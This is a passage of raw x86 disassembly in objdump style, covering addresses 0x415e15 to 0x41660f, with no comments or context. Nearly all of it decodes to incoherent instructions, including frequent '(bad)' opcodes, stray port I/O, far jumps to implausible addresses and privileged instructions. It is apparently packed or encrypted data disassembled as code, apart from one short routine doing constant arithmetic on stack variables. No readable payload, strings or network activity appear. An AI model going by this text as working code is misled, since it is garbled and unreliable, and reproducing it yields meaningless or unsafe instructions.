  415e15:	pop    ebx
  415e16:	sub    eax,ebx
  415e18:	mov    esi,0x79072cc9
  415e1d:	xlat   BYTE PTR ds:[ebx]
  415e1e:	int3   
  415e1f:	scas   al,BYTE PTR es:[edi]
  415e20:	leave  
  415e21:	push   esp
  415e22:	push   0x480af3e1
  415e27:	inc    ebx
  415e28:	sbb    edx,eax
  415e2a:	les    edx,FWORD PTR [esi+0x36088c3d]
  415e30:	ja     0x415e4c
  415e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e33:	jl     0x415e84
  415e35:	or     dl,BYTE PTR [esi]
  415e37:	ss out dx,al
  415e39:	xor    bl,BYTE PTR [esp+edx*1]
  415e3c:	lahf   
  415e3d:	shl    BYTE PTR [ebp+eiz*2-0x7e31b8ab],1
  415e44:	jmp    0x415e17
  415e46:	mov    eax,0x67362110
  415e4b:	lea    eax,[edx+0x26]
  415e4e:	mov    al,ds:0x48d2818e
  415e53:	loopne 0x415e60
  415e55:	popf   
  415e56:	add    BYTE PTR [ebx+ebp*2-0x75],bh
  415e5a:	out    0xb4,al
  415e5c:	fistp  QWORD PTR [ebx+esi*8-0x7c]
  415e60:	mov    edi,0xf135b947
  415e65:	add    bl,BYTE PTR [edi-0x55871b52]
  415e6b:	mov    cl,0x7d
  415e6d:	xchg   ecx,eax
  415e6e:	scas   eax,DWORD PTR es:[edi]
  415e6f:	jae    0x415e2a
  415e71:	nop
  415e72:	add    dh,dl
  415e74:	ret    
  415e75:	ins    DWORD PTR es:[edi],dx
  415e76:	push   0x3d
  415e78:	dec    edi
  415e79:	test   al,0xff
  415e7b:	jne    0x415e96
  415e7d:	and    DWORD PTR fs:[edx-0xdec8c6d],ecx
  415e84:	sti    
  415e85:	je     0x415e3d
  415e87:	(bad)  
  415e88:	adc    cl,BYTE PTR [eax-0x68d9738e]
  415e8e:	mov    ds,WORD PTR [ebp+0x5a]
  415e91:	xor    al,0x16
  415e93:	(bad)  
  415e94:	mov    ah,0xba
  415e96:	retf   0x5575
  415e99:	jns    0x415ec0
  415e9b:	xchg   DWORD PTR [edi+0x2],esi
  415e9e:	and    ebp,ebp
  415ea0:	dec    esi
  415ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ea2:	repz cmp al,0xa5
  415ea5:	push   0x54a79772
  415eaa:	outs   dx,DWORD PTR ds:[esi]
  415eab:	clc    
  415eac:	pop    edx
  415ead:	inc    ebp
  415eae:	daa    
  415eaf:	imul   edi,DWORD PTR [ebp+0x14],0xffffffd2
  415eb3:	xor    BYTE PTR [ecx],ch
  415eb5:	gs pop es
  415eb7:	mov    edx,0xae607d16
  415ebc:	repnz (bad) 
  415ebf:	and    esp,ebx
  415ec1:	call   0x9e476621
  415ec6:	or     ch,BYTE PTR [edx]
  415ec8:	add    BYTE PTR [esi+0x61a9c18f],dh
  415ece:	outs   dx,BYTE PTR ds:[esi]
  415ecf:	test   DWORD PTR [eax-0x61],edi
  415ed2:	xor    DWORD PTR [edi],ebx
  415ed4:	jecxz  0x415ec0
  415ed6:	cmc    
  415ed7:	and    al,0x2b
  415ed9:	adc    DWORD PTR [eax-0x1],eax
  415edc:	pusha  
  415edd:	fistp  QWORD PTR [ebx-0x24]
  415ee0:	mov    ds:0x380912a9,al
  415ee5:	push   esp
  415ee6:	dec    ebx
  415ee7:	pop    eax
  415ee8:	cld    
  415ee9:	xchg   edi,eax
  415eea:	fdivr  DWORD PTR [eax-0x36b0d74d]
  415ef0:	pop    edi
  415ef1:	arpl   WORD PTR [ebx+0x310bfa3f],bp
  415ef7:	aaa    
  415ef8:	das    
  415ef9:	retf   
  415efa:	mov    ah,0x4a
  415efc:	loop   0x415f20
  415efe:	jmp    0xeed8762a
  415f03:	popa   
  415f04:	pusha  
  415f05:	dec    eax
  415f06:	fidivr WORD PTR [edx]
  415f08:	leave  
  415f09:	cwde   
  415f0a:	dec    esp
  415f0b:	xchg   edi,eax
  415f0c:	cmp    DWORD PTR [edx],edi
  415f0e:	inc    edx
  415f0f:	cld    
  415f10:	je     0x415e94
  415f12:	dec    esp
  415f13:	(bad)  
  415f14:	aad    0xcd
  415f16:	mov    al,ds:0xda058446
  415f1b:	push   ebx
  415f1c:	jb     0x415f19
  415f1e:	mov    fs,WORD PTR [eax]
  415f20:	sti    
  415f21:	inc    esi
  415f22:	stos   DWORD PTR es:[edi],eax
  415f23:	and    eax,0x8237c873
  415f28:	js     0x415f03
  415f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f2b:	sbb    BYTE PTR [edi],bl
  415f2d:	mov    bl,0x15
  415f2f:	lea    edx,[ebx+0x9]
  415f32:	sub    BYTE PTR [ebx],ch
  415f34:	cmp    eax,0x5533fdd4
  415f39:	outs   dx,DWORD PTR ds:[esi]
  415f3a:	jmp    0x1e9de697
  415f3f:	jl     0x415eda
  415f41:	shl    DWORD PTR [eax+0x65],0x5a
  415f45:	scas   eax,DWORD PTR es:[edi]
  415f46:	jge    0x415eef
  415f48:	dec    eax
  415f49:	fsubr  DWORD PTR [esi-0x36239ed1]
  415f4f:	fimul  WORD PTR [edx+0x31]
  415f52:	mov    al,ds:0x86870e6c
  415f57:	inc    esp
  415f58:	out    dx,eax
  415f59:	mov    edx,0x1f0ed32c
  415f5e:	mov    cl,0xc9
  415f60:	cmp    al,bl
  415f62:	neg    DWORD PTR [ecx+0x14]
  415f65:	arpl   WORD PTR [edx],di
  415f67:	xor    DWORD PTR [ebx+ebp*8+0x698d42bf],0xb0a9df55
  415f72:	sub    eax,0x35ad1a3b
  415f77:	dec    edi
  415f78:	add    ch,BYTE PTR [edx-0xf]
  415f7b:	mov    esp,DWORD PTR [edx+0x3390227f]
  415f81:	and    BYTE PTR [ecx-0x87be437],cl
  415f87:	(bad)  
  415f88:	call   0xa47d5930
  415f8d:	(bad)  
  415f8e:	enter  0xe3ff,0x20
  415f92:	pop    ebp
  415f93:	cwde   
  415f94:	mov    cl,BYTE PTR [ecx]
  415f96:	dec    esp
  415f97:	(bad)  
  415f99:	mov    ebp,0x12047232
  415f9e:	lods   al,BYTE PTR fs:[esi]
  415fa0:	push   ds
  415fa1:	clc    
  415fa2:	pop    edi
  415fa3:	mov    ah,0xa
  415fa5:	add    DWORD PTR [edx+0x3c],0x86fed152
  415fac:	cld    
  415fad:	cmp    al,0x44
  415faf:	add    DWORD PTR [esi],ecx
  415fb1:	aad    0x17
  415fb3:	pusha  
  415fb4:	adc    edx,edx
  415fb6:	and    ah,BYTE PTR [edx-0x42]
  415fb9:	adc    DWORD PTR [ecx-0x7828d6e],ecx
  415fbf:	jnp    0x416019
  415fc1:	mov    al,0x61
  415fc3:	add    esi,DWORD PTR [eax+0x4c6ca069]
  415fc9:	jl     0x416044
  415fcb:	mov    esi,?
  415fcd:	das    
  415fce:	int    0x69
  415fd0:	inc    esi
  415fd1:	mov    al,ds:0x41e0dbf6
  415fd6:	jnp    0x415f95
  415fd8:	xor    DWORD PTR [ebx+0x21389654],ebp
  415fde:	push   esp
  415fdf:	icebp  
  415fe0:	pop    edi
  415fe1:	add    DWORD PTR [edi-0x3ff65277],ecx
  415fe7:	xlat   BYTE PTR ds:[ebx]
  415fe8:	adc    DWORD PTR [ebp+0x5d5f4c70],eax
  415fee:	das    
  415fef:	fld    QWORD PTR [esi+ebp*1-0x47]
  415ff3:	push   es
  415ff4:	jle    0x415ff9
  415ff6:	mov    bh,0x88
  415ff8:	xchg   edx,eax
  415ff9:	(bad)  
  415ffa:	xchg   ebx,eax
  415ffb:	dec    ebx
  415ffc:	(bad)  
  415ffd:	lds    ebp,FWORD PTR [edi]
  415fff:	lahf   
  416000:	inc    ecx
  416001:	xchg   esi,eax
  416002:	sub    al,0xd6
  416004:	imul   esi,DWORD PTR [ebx],0xb05589d3
  41600a:	mov    edx,DWORD PTR [ebp+0x8]
  41600d:	mov    ebx,DWORD PTR [ebp-0x4c]
  416010:	add    edx,edi
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0x85e7fc3c
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	jecxz  0x416047
  41605d:	jmp    0x7a0d:0x79803517
  416064:	cli    
  416065:	nop
  416066:	das    
  416067:	jb     0x4160b0
  416069:	sbb    al,0xed
  41606b:	or     eax,0x1d386dc
  416070:	xchg   dl,ch
  416072:	adc    DWORD PTR [edx],ecx
  416074:	sbb    al,0x9c
  416076:	mov    dl,0x38
  416078:	hlt    
  416079:	icebp  
  41607a:	mov    dh,0x97
  41607c:	jge    0x4160f4
  41607e:	add    edi,edx
  416080:	cmp    eax,0x75f8243f
  416085:	xor    BYTE PTR [esp+esi*2-0x5fa839a1],bh
  41608c:	xor    edx,edi
  41608e:	sub    eax,0xec9b6a4b
  416093:	mov    dh,0x1f
  416095:	jae    0x4160b2
  416097:	mov    bh,0xdc
  416099:	sbb    al,BYTE PTR [ecx]
  41609b:	pop    edi
  41609c:	xchg   edi,esp
  41609e:	ficom  DWORD PTR [ebx-0x1a]
  4160a1:	cld    
  4160a2:	pusha  
  4160a3:	cmp    esi,DWORD PTR [esi]
  4160a5:	dec    edx
  4160a6:	pop    ds
  4160a7:	lds    edi,FWORD PTR ds:0xe45ce6fc
  4160ad:	cdq    
  4160ae:	inc    ebp
  4160af:	sub    eax,0x1af59734
  4160b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160b5:	pop    eax
  4160b6:	push   edi
  4160b7:	loope  0x416087
  4160b9:	push   0x3e
  4160bb:	mov    eax,ds:0xfcc28a8b
  4160c0:	imul   DWORD PTR [ecx-0x61]
  4160c3:	stc    
  4160c4:	mov    bh,0x44
  4160c6:	ss sti 
  4160c8:	not    al
  4160ca:	mov    dh,0x63
  4160cc:	push   DWORD PTR [esi+edx*4-0x6f03a8c2]
  4160d3:	pusha  
  4160d4:	cmp    al,0x13
  4160d6:	mov    ebx,0x18bc8bcb
  4160db:	dec    edx
  4160dc:	dec    esp
  4160dd:	dec    ecx
  4160de:	arpl   WORD PTR [ecx-0x7a28a598],ax
  4160e4:	pusha  
  4160e5:	xchg   BYTE PTR [edi+0x1a],al
  4160e8:	aaa    
  4160e9:	lock pop edx
  4160eb:	lds    esi,FWORD PTR [ebx-0xc]
  4160ee:	imul   ebx,DWORD PTR [eax],0x2f5360ec
  4160f4:	mov    DWORD PTR ds:0x24cb5303,esi
  4160fa:	jecxz  0x4160b8
  4160fc:	add    edi,DWORD PTR [ebx]
  4160fe:	inc    esp
  4160ff:	mov    bl,0x1b
  416101:	mov    cl,0x65
  416103:	pop    esi
  416104:	xor    BYTE PTR [eax+0x10],0xd7
  416108:	stos   DWORD PTR es:[edi],eax
  416109:	jl     0x416101
  41610b:	popf   
  41610c:	cmp    DWORD PTR [eax-0x1e],edx
  41610f:	inc    edx
  416110:	arpl   WORD PTR [ebp+edi*1-0x67],ax
  416114:	repnz push esi
  416116:	fsub   QWORD PTR [edx-0x3e022c4b]
  41611c:	sbb    ch,BYTE PTR [edx-0x22f4869a]
  416122:	ror    BYTE PTR [edi-0x20e045b],0x7
  416129:	mov    eax,0x9a41e2bf
  41612e:	out    dx,al
  41612f:	lods   eax,DWORD PTR ds:[esi]
  416130:	ret    
  416131:	sahf   
  416132:	ss ins BYTE PTR es:[edi],dx
  416134:	stc    
  416135:	div    ah
  416137:	int3   
  416138:	jge    0x41618d
  41613a:	xor    DWORD PTR ds:0x9df12853,esi
  416140:	jmp    0x416160
  416142:	std    
  416143:	gs inc ebp
  416145:	leave  
  416146:	cmc    
  416147:	pop    es
  416148:	cmp    DWORD PTR [edx],0xf0ec1d64
  41614e:	fild   DWORD PTR [esi+0x7845beb9]
  416154:	mov    bh,0xbf
  416156:	fisttp DWORD PTR [ecx+eax*4]
  416159:	sbb    ebx,edx
  41615b:	test   bh,al
  41615d:	dec    edx
  41615e:	fsubrp st(7),st
  416160:	fs mov eax,0x1768c54d
  416166:	xor    eax,DWORD PTR [esi-0x6923c8f2]
  41616c:	add    esi,DWORD PTR [esi-0x58]
  41616f:	pushf  
  416170:	add    al,0x15
  416172:	adc    DWORD PTR [edi-0x6f11f3bf],ebx
  416178:	and    eax,0x9772b694
  41617d:	jbe    0x97f9b058
  416183:	pop    esi
  416184:	adc    DWORD PTR [ebx-0x54],esi
  416187:	(bad)  
  416188:	push   ds
  416189:	mov    ds:0x136a26ad,al
  41618e:	jp     0x416201
  416190:	and    al,0xb5
  416192:	jl     0x4161fe
  416194:	jg     0x416122
  416196:	push   cs
  416197:	(bad)  
  416198:	sti    
  416199:	xchg   ebx,eax
  41619a:	stos   BYTE PTR es:[edi],al
  41619b:	add    eax,DWORD PTR [edx]
  41619d:	mov    al,ds:0x56191e5a
  4161a2:	inc    ebp
  4161a3:	fidivr WORD PTR [edx]
  4161a5:	mov    esp,fs
  4161a7:	shl    DWORD PTR ds:0xffc12405,0xaa
  4161ae:	sahf   
  4161af:	sub    eax,eax
  4161b1:	adc    eax,0x1f43a03d
  4161b6:	pop    eax
  4161b7:	jecxz  0x416226
  4161b9:	push   esi
  4161ba:	cs jge 0x4161f8
  4161bd:	mov    ecx,0x46bdcc56
  4161c2:	sub    DWORD PTR ds:0xfa237ce5,esp
  4161c8:	or     al,0x14
  4161ca:	ds shr al,1
  4161cd:	fadd   QWORD PTR ds:0x2998675b
  4161d3:	cmc    
  4161d4:	imul   eax,DWORD PTR [ebx],0x6
  4161d7:	sbb    DWORD PTR [esi],eax
  4161d9:	shl    DWORD PTR [esi+ecx*1],1
  4161dc:	pusha  
  4161dd:	inc    ebp
  4161de:	and    ch,BYTE PTR [ecx-0x8ece03d]
  4161e4:	dec    esp
  4161e5:	push   ecx
  4161e6:	mov    BYTE PTR [edx],bl
  4161e8:	(bad)  
  4161e9:	sub    eax,0x2033c5e7
  4161ee:	int3   
  4161ef:	les    edx,FWORD PTR [eax+eiz*4+0x462466dd]
  4161f6:	pushf  
  4161f7:	and    DWORD PTR [ecx-0x554f7b15],0xc68563ac
  416201:	or     DWORD PTR [ebp-0x4b],edx
  416204:	push   ecx
  416205:	fidivr DWORD PTR ds:0x99b9
  41620a:	or     al,0xdd
  41620c:	in     eax,0x29
  41620e:	ficom  DWORD PTR [edi]
  416210:	dec    ebp
  416211:	test   DWORD PTR [ebx-0x17],edi
  416214:	adc    eax,0xa6131a0
  416219:	inc    esp
  41621a:	hlt    
  41621b:	xor    esp,eax
  41621d:	jae    0x4161a3
  41621f:	scas   al,BYTE PTR es:[edi]
  416220:	mov    ebp,DWORD PTR [ecx-0x35a94d5c]
  416226:	and    ebp,DWORD PTR fs:[ecx+0x3f]
  41622a:	adc    al,0x43
  41622c:	int    0xb9
  41622e:	xchg   esi,eax
  41622f:	dec    edx
  416230:	sbb    eax,0x93cfe3f5
  416235:	outs   dx,DWORD PTR ds:[esi]
  416236:	fdiv   QWORD PTR [ecx+ecx*1+0x7af20c80]
  41623d:	lock sbb BYTE PTR [edx-0x4a],dh
  416241:	loopne 0x416251
  416243:	jne    0x416284
  416245:	hlt    
  416246:	test   eax,0x649140b0
  41624b:	cli    
  41624c:	mov    edi,0x2bc3e69a
  416251:	addr16 push ecx
  416253:	xchg   edx,eax
  416254:	gs or  eax,0x5c59b540
  41625a:	out    0x8d,eax
  41625c:	inc    ebx
  41625d:	or     BYTE PTR [eax+0x7b321e18],0x20
  416264:	icebp  
  416265:	xor    edi,esp
  416267:	push   esi
  416268:	mov    bh,BYTE PTR [eax-0x35586e57]
  41626e:	cmp    al,0xd
  416270:	xor    bh,dl
  416272:	pop    eax
  416273:	pop    ecx
  416274:	pop    eax
  416275:	into   
  416276:	in     eax,dx
  416277:	shl    DWORD PTR [esp+eiz*2+0x2c],1
  41627b:	cdq    
  41627c:	imul   edx,DWORD PTR [edi],0x2
  41627f:	add    edx,DWORD PTR [ebx]
  416281:	lods   eax,DWORD PTR ds:[esi]
  416282:	ins    DWORD PTR es:[edi],dx
  416283:	sub    eax,0x177d43f4
  416288:	sbb    eax,0x1584d1ee
  41628d:	jmp    0x4162e4
  41628f:	xor    eax,0x65ee2262
  416294:	popf   
  416295:	adc    ecx,DWORD PTR [edx+0x1966d298]
  41629b:	out    0xd2,al
  41629d:	and    eax,0xe7513ff2
  4162a2:	sbb    BYTE PTR [ebp+0x65e217a8],0x92
  4162a9:	pop    edx
  4162aa:	test   BYTE PTR [eax-0x286b19bd],0x75
  4162b1:	or     BYTE PTR [ebp+0x2],bl
  4162b4:	ret    
  4162b5:	jecxz  0x416325
  4162b7:	shl    dl,0xe2
  4162ba:	cmp    eax,0x78f2e7da
  4162bf:	mov    eax,0xad8305ff
  4162c4:	(bad)  
  4162c5:	out    dx,al
  4162c6:	or     DWORD PTR [eax-0xf],esi
  4162c9:	(bad)  
  4162ca:	test   eax,0x3d5e860d
  4162cf:	leave  
  4162d0:	add    BYTE PTR [ebx+0x20952128],bh
  4162d6:	xchg   esi,eax
  4162d7:	inc    esi
  4162d8:	add    eax,0xf19bc1f1
  4162dd:	dec    BYTE PTR [ecx-0x27]
  4162e0:	mov    edx,0xda609aa3
  4162e5:	jp     0x416341
  4162e7:	mov    al,0xfb
  4162e9:	dec    edi
  4162ea:	inc    ebx
  4162eb:	and    al,0xbf
  4162ed:	icebp  
  4162ee:	iret   
  4162ef:	mov    al,ds:0x754b1c77
  4162f4:	stc    
  4162f5:	das    
  4162f6:	mov    al,ds:0x8bf42095
  4162fb:	cmp    al,0x68
  4162fd:	imul   esi,edx,0x2d2879e6
  416303:	fld    TBYTE PTR [eax]
  416305:	loopne 0x416314
  416307:	add    al,0x7b
  416309:	pop    ss
  41630a:	out    dx,al
  41630b:	and    BYTE PTR [eax-0x18369afe],bh
  416311:	nop    DWORD PTR [edx]
  416314:	push   cs
  416315:	fmul   QWORD PTR [ebp+0x12a439f5]
  41631b:	call   0xcf6074b6
  416320:	cmovae ecx,DWORD PTR [esi+0x0]
  416324:	adc    bh,BYTE PTR [esi-0x5ac96f0]
  41632a:	daa    
  41632b:	int3   
  41632c:	and    edi,DWORD PTR [ebx]
  41632e:	pushf  
  41632f:	pop    es
  416330:	fld    DWORD PTR [ebp-0x29be5c6]
  416336:	sbb    al,bl
  416338:	adc    al,0xe8
  41633a:	sbb    ecx,ebp
  41633c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41633d:	pop    eax
  41633e:	sahf   
  41633f:	xor    eax,0x8f87618a
  416344:	mov    dl,ch
  416346:	jb     0x4162ef
  416348:	and    ebp,ecx
  41634a:	xchg   ecx,eax
  41634b:	ret    0x3ba5
  41634e:	pusha  
  41634f:	sub    eax,0xe8cffd65
  416354:	scas   al,BYTE PTR es:[edi]
  416355:	sbb    dl,BYTE PTR [esi]
  416357:	pop    edx
  416358:	push   0x7c673de7
  41635d:	mov    edi,0x94f85cbc
  416362:	out    dx,eax
  416363:	sti    
  416364:	stos   DWORD PTR es:[edi],eax
  416365:	out    dx,al
  416366:	nop
  416367:	rol    DWORD PTR [ebx+0x47],1
  41636a:	ins    BYTE PTR es:[edi],dx
  41636b:	push   eax
  41636c:	call   0xdca6208f
  416371:	push   0xffffff88
  416373:	mov    eax,0x7b55e7b0
  416378:	mov    bh,BYTE PTR [ebp+0x5]
  41637b:	pop    esp
  41637c:	and    bl,BYTE PTR [eax-0x2e]
  41637f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416380:	push   eax
  416381:	sti    
  416382:	xchg   edi,eax
  416383:	dec    eax
  416384:	stos   DWORD PTR es:[edi],eax
  416385:	dec    edi
  416386:	mov    esp,0x6da2af4a
  41638b:	xchg   edx,eax
  41638d:	cs pop ebp
  41638f:	pop    esp
  416390:	repnz add al,0x88
  416393:	je     0x4163c4
  416395:	fstp   DWORD PTR [edi]
  416397:	mov    ch,0x82
  416399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41639a:	jecxz  0x4163b2
  41639c:	mov    edi,0x4158c1f3
  4163a1:	and    cl,BYTE PTR [eax-0x34]
  4163a4:	(bad)
  4163a8:	push   esp
  4163a9:	in     eax,dx
  4163aa:	gs xchg ecx,eax
  4163ac:	add    DWORD PTR [eax-0x7355ff1c],0x37
  4163b3:	add    ah,bh
  4163b5:	shr    DWORD PTR [esi+eiz*8-0xe68ec60],cl
  4163bc:	adc    ecx,esp
  4163be:	mov    al,ds:0x8fc23b12
  4163c3:	daa    
  4163c4:	push   ss
  4163c5:	pop    DWORD PTR [ecx]
  4163c7:	sub    al,0x1
  4163c9:	sub    al,0xfc
  4163cb:	pop    edi
  4163cc:	aad    0x1
  4163ce:	push   ss
  4163cf:	mov    edx,0x39dfe5fd
  4163d4:	adc    ch,BYTE PTR [ebx]
  4163d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d7:	shl    bh,0x9
  4163da:	out    0x9a,al
  4163dc:	fstp   DWORD PTR [ebx]
  4163de:	loopne 0x4163d6
  4163e0:	hlt    
  4163e1:	ret    0x1cbd
  4163e4:	and    BYTE PTR [eax],bl
  4163e6:	test   eax,0x3256bf42
  4163eb:	and    bh,0x3a
  4163ee:	adc    edx,DWORD PTR ds:0xb90917cd
  4163f4:	jmp    0x8a8914b8
  4163f9:	mov    ecx,0xd3729697
  4163fe:	pop    edi
  4163ff:	mul    BYTE PTR [eax]
  416401:	out    dx,eax
  416402:	enter  0xb30f,0x21
  416406:	xchg   eax,ebp
  416408:	std    
  416409:	mov    DWORD PTR [eax],0x7f20c039
  41640f:	repnz inc edx
  416411:	ret    
  416412:	in     eax,dx
  416413:	xor    BYTE PTR es:[esi+0x57],ah
  416417:	mov    esi,0x1c54cb6a
  41641c:	mov    eax,0xbd913a50
  416421:	les    ebx,FWORD PTR [ebx-0x301c9597]
  416427:	ret    0x447f
  41642a:	push   0x6b9734e5
  41642f:	data16 rcl BYTE PTR [edx+ebp*2+0x56698d5],1
  416437:	in     al,dx
  416438:	cld    
  416439:	lods   eax,DWORD PTR ds:[esi]
  41643a:	(bad)  
  41643b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41643c:	jae    0x4163c1
  41643e:	in     al,0xf1
  416440:	xchg   ebx,eax
  416441:	outs   dx,BYTE PTR ds:[esi]
  416442:	dec    ebp
  416443:	(bad)  
  416444:	mov    esi,DWORD PTR [esi+0x47]
  416447:	fisub  DWORD PTR [eax+0x1f]
  41644a:	xlat   BYTE PTR ds:[ebx]
  41644b:	mov    ebx,0x2480eb5e
  416450:	je     0x416406
  416452:	dec    ecx
  416453:	pop    edx
  416454:	(bad)  ds:[eax+0x10]
  416458:	pop    ecx
  416459:	retf   
  41645a:	mov    BYTE PTR [edx+ecx*4+0x4dcd12aa],0x84
  416462:	sahf   
  416463:	jmp    0x8f01:0xdaae2b1e
  41646a:	arpl   WORD PTR ds:0xa487da3d,si
  416470:	sub    ch,bh
  416472:	adc    BYTE PTR [ebp-0x73],0xd4
  416476:	(bad)  
  416477:	icebp  
  416478:	pop    ds
  416479:	dec    ebp
  41647a:	rcl    DWORD PTR [edx-0x5c],0x7d
  41647e:	dec    edi
  41647f:	add    edx,edx
  416481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416482:	xchg   esi,eax
  416483:	ds jno 0x416499
  416486:	and    eax,0xbdd5272d
  41648b:	push   ebp
  41648c:	adc    eax,0x56e7c74
  416491:	dec    BYTE PTR [ebx+0x57eab57e]
  416497:	adc    BYTE PTR [edx-0x4daa9001],bh
  41649d:	rol    eax,0x27
  4164a0:	mov    bl,0xf1
  4164a2:	sar    DWORD PTR [edi-0x79560d7d],0x55
  4164a9:	jmp    0x9f1f:0x7a032778
  4164b0:	inc    ecx
  4164b1:	shr    BYTE PTR [ebp+0x1d],1
  4164b4:	repz popa 
  4164b6:	out    0xe0,al
  4164b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164b9:	inc    eax
  4164ba:	test   BYTE PTR [edi],dh
  4164bc:	add    eax,0x6ef8b3db
  4164c1:	mov    ebp,0xc8446bf3
  4164c6:	push   0xa0d8433
  4164cb:	les    ebp,FWORD PTR [edx-0x35]
  4164ce:	xchg   ebx,eax
  4164cf:	push   es
  4164d0:	arpl   WORD PTR [esi],si
  4164d2:	inc    ecx
  4164d3:	push   ss
  4164d4:	out    dx,al
  4164d5:	and    al,0x90
  4164d7:	jle    0x4164f4
  4164d9:	mov    WORD PTR [esi-0x1a],es
  4164dc:	mul    BYTE PTR [eax-0x9]
  4164df:	stos   DWORD PTR es:[edi],eax
  4164e0:	gs lock sahf 
  4164e3:	mov    bl,BYTE PTR [eax+0x60]
  4164e6:	sbb    DWORD PTR [edi+0x4199d711],eax
  4164ec:	mov    ds:0x8fe23e7c,eax
  4164f1:	add    dh,BYTE PTR [eax-0x5b14169]
  4164f7:	es push ebp
  4164f9:	sub    bl,cl
  4164fb:	mov    bh,BYTE PTR [ebp-0x18af91e2]
  416501:	or     BYTE PTR [esi-0x5847e166],al
  416507:	xor    DWORD PTR [eax],esp
  416509:	push   edi
  41650a:	xchg   edi,eax
  41650b:	add    BYTE PTR ds:0xea024892,dh
  416511:	fsubr  QWORD PTR [edx+0x1d]
  416514:	mov    cl,0x60
  416516:	or     ebp,0xffffffcb
  416519:	dec    ecx
  41651a:	dec    ebx
  41651b:	(bad)  
  41651c:	adc    edi,esi
  41651e:	retf   
  41651f:	fwait
  416520:	dec    ebx
  416521:	inc    esi
  416522:	sbb    al,0x46
  416524:	out    dx,al
  416525:	inc    edi
  416526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416527:	ins    BYTE PTR es:[edi],dx
  416528:	push   DWORD PTR [eax+0x8]
  41652b:	aaa    
  41652c:	(bad)  
  41652d:	leave  
  41652e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41652f:	xchg   edi,eax
  416530:	xchg   edx,eax
  416531:	mov    ch,0x41
  416533:	adc    DWORD PTR [edx-0x59bce3a7],edi
  416539:	xchg   esi,eax
  41653a:	pop    esi
  41653b:	push   edx
  41653c:	je     0x41650e
  41653e:	ffree  st(1)
  416540:	shl    DWORD PTR [edx],1
  416542:	push   0xffffff84
  416544:	retf   
  416545:	imul   esi,DWORD PTR [ecx+0x44f0926e],0x691d2d5c
  41654f:	(bad)  
  416550:	repnz xlat BYTE PTR ds:[ebx]
  416552:	mov    cl,cl
  416554:	(bad)  
  416555:	retf   
  416556:	cmp    al,0x5f
  416558:	jmp    0xd24f:0xd1c6d3a3
  41655f:	sti    
  416560:	int    0xa6
  416562:	pop    ecx
  416563:	xor    edi,ecx
  416565:	call   0xd950:0x3d0e948c
  41656c:	mov    BYTE PTR [ebx-0xcbab5f3],dl
  416572:	aad    0xe3
  416574:	call   0x559583e0
  416579:	out    dx,eax
  41657a:	aaa    
  41657b:	push   edi
  41657c:	dec    esp
  41657d:	sbb    dh,al
  41657f:	cmp    DWORD PTR [ecx+0x4],ecx
  416582:	jno    0x41655d
  416584:	add    bl,dh
  416586:	sub    eax,0xfef678d2
  41658b:	mov    cl,0x75
  41658d:	push   ecx
  41658e:	int    0x4f
  416590:	jp     0x416554
  416592:	jne    0x4165ca
  416594:	int3   
  416595:	mov    eax,ds:0x95a1a3f
  41659a:	in     eax,0xd1
  41659c:	xchg   ebx,eax
  41659d:	pop    edi
  41659e:	adc    DWORD PTR [ebx-0x17],0x75029cb8
  4165a5:	jnp    0x41658b
  4165a7:	push   ecx
  4165a8:	add    dh,BYTE PTR [edx+0xa]
  4165ab:	jno    0x416552
  4165ad:	xor    al,0x45
  4165af:	push   ebx
  4165b0:	pop    esi
  4165b1:	dec    edi
  4165b2:	mov    bl,0x2e
  4165b4:	shl    BYTE PTR [esi-0x7ff463d1],1
  4165ba:	popa   
  4165bb:	mov    edx,0x142e2b82
  4165c0:	aas    
  4165c1:	mov    eax,ds:0xa429777a
  4165c6:	sub    BYTE PTR ds:0x6c71b6e9,dl
  4165cc:	inc    esp
  4165cd:	sbb    esi,ebp
  4165cf:	push   es
  4165d0:	mov    al,ds:0x7cb0977e
  4165d5:	jecxz  0x4165fc
  4165d7:	jae    0x4165bb
  4165d9:	(bad)  
  4165db:	outs   dx,BYTE PTR ds:[esi]
  4165dc:	or     ah,bh
  4165de:	lea    edi,[ebx+0x7ab3cd27]
  4165e4:	cmp    edi,DWORD PTR [esp+eiz*8-0x4f46680c]
  4165eb:	lock jmp 0x416616
  4165ee:	sbb    eax,DWORD PTR [ebx]
  4165f0:	mov    edx,0x2db9c4e5
  4165f5:	or     bl,0x8b
  4165f8:	xor    BYTE PTR [ecx],dh
  4165fa:	inc    ebp
  4165fb:	fwait
  4165fc:	jmp    0xef0f:0x49b15901
  416603:	es dec ebx
  416605:	(bad)  
  416606:	fst    QWORD PTR [esi]
  416608:	fcomp  QWORD PTR [ebp-0x61ffd0a7]
  41660e:	hlt    
  41660f:	mov    WORD PTR [edx-0x40],ss
